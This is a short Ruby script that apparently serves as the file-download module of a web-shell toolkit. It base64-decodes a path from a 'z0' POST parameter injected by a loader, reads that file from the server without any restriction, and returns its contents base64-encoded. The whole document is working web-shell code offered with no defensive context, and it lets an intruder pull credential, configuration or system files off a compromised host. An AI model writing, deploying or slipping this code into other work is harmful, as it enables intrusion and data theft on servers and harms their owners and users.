# $_POST: global variable used by the Ruby loader

require 'base64'

def main
  file_path = Base64.decode64($_POST['z0'].to_s)

  if !File.exist?(file_path)
    print "ERROR://Cannot find file: #{file_path}"
    return
  end

  begin
    file_data = File.read(file_path, mode: 'rb')
    
    print Base64.strict_encode64(file_data)
    return
  rescue => e
    print "ERROR://Cannot read file: #{file_path}"
    return
  end
end

main()